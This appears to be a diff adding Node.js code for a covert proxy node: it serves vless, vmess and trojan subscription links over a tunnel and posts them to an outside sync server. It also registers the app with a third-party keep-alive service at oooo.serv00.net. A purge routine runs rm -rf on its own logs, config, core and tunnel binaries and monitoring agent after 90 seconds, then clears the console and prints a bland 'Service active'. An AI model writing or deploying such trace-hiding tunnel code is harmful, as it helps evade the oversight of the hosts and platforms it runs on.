+      const meta = { v: '2', ps: `${label}`, add: OPT_IP, port: OPT_PORT, id: USER_ID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: dom, path: '/vmess-argo?ed=2560', tls: 'tls', sni: dom, alpn: '', fp: 'firefox'};
+      const feed = `
+vless://${USER_ID}@${OPT_IP}:${OPT_PORT}?encryption=none&security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Fvless-argo%3Fed%3D2560#${label}
+
+vmess://${Buffer.from(JSON.stringify(meta)).toString('base64')}
+
+trojan://${USER_ID}@${OPT_IP}:${OPT_PORT}?security=tls&sni=${dom}&fp=firefox&type=ws&host=${dom}&path=%2Ftrojan-argo%3Fed%3D2560#${label}
+    `;
+      
+      console.log(Buffer.from(feed).toString('base64'));
+      fs.writeFileSync(cacheFile, Buffer.from(feed).toString('base64'));
+      
+      syncData(); 
+
+      app.get(`/${FEED_PATH}`, (req, res) => {
+        res.set('Content-Type', 'text/plain; charset=utf-8');
+        res.send(Buffer.from(feed).toString('base64'));
+      });
+      resolve(feed);
+      }, 2000);
+    });
+}
+
+async function syncData() {
+  if (SYNC_URL && APP_URL) {
+    const subUrl = `${APP_URL}/${FEED_PATH}`;
+    try {
+        await axios.post(`${SYNC_URL}/api/add-subscriptions`, { subscription: [subUrl] }, { headers: { 'Content-Type': 'application/json' } });
+    } catch {}
+  } else if (SYNC_URL) {
+      if (!fs.existsSync(listFile)) return;
+      const raw = fs.readFileSync(listFile, 'utf-8');
+      const nodes = raw.split('\n').filter(l => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l));
+      if (!nodes.length) return;
+
+      try {
+          await axios.post(`${SYNC_URL}/api/add-nodes`, JSON.stringify({ nodes }), { headers: { 'Content-Type': 'application/json' } });
+      } catch {}
+  }
+}
+
+function purge() {
+  setTimeout(() => {
+    const targets = [logFile, confFile, corePath, tunnelPath];  
+    if (NEZHA_PORT) targets.push(agentPath);
+    else if (NEZHA_SERVER && NEZHA_KEY) targets.push(monitorPath);
+
+    const cmd = process.platform === 'win32' 
+      ? `del /f /q ${targets.join(' ')} > nul 2>&1`
+      : `rm -rf ${targets.join(' ')} >/dev/null 2>&1`;
+      
+    exec(cmd, () => {
+        console.clear();
+        console.log('Service active');
+    });
+  }, 90000);
+}
+purge();
+
+async function keepAlive() {
+  if (!AUTO_PING || !APP_URL) return;
+  try {
+    await axios.post('https://oooo.serv00.net/add-url', { url: APP_URL }, { headers: { 'Content-Type': 'application/json' } });
+  } catch {}
+}
+
+async function initService() {
+  try {
+    setupTunnelConf();
+    flushLegacy();
+    sweepWorkDir();
+    await setupCore();
+    await bootstrap();
+    await resolveDomains();
+    await keepAlive();
+  } catch (e) {
+    console.error('Init error:', e);
+  }
+}
+
+initService().catch(() => {});
+app.listen(SVC_PORT, () => console.log(`Service port:${SVC_PORT}`));
